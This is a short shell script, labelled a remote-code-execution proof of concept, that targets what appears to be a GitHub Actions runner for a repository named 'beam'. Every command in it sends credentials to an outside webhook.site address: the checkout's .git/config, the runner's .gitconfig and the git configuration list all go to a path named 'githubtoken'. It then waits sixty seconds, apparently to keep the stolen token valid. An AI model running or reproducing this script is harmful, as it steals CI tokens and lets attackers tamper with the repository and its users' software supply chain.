#filename: myscript.sh
echo -------------poc_rce-------------- >&2



export webhook="https://webhook.site/605c679f-5fed-4164-93b6-5d1eb4a6a352"

curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(cat /home/runner/work/beam/beam/.git/config)" \
    "$webhook/githubtoken"

curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(git config --list)" \
    "$webhook/githubtoken"



curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(cat /home/runner/.gitconfig)" \
    "$webhook/githubtoken"

curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(cat /home/runner/work/beam/beam/.git/config)" \
  "$webhook/githubtoken"


git config --list >&2
sleep 60
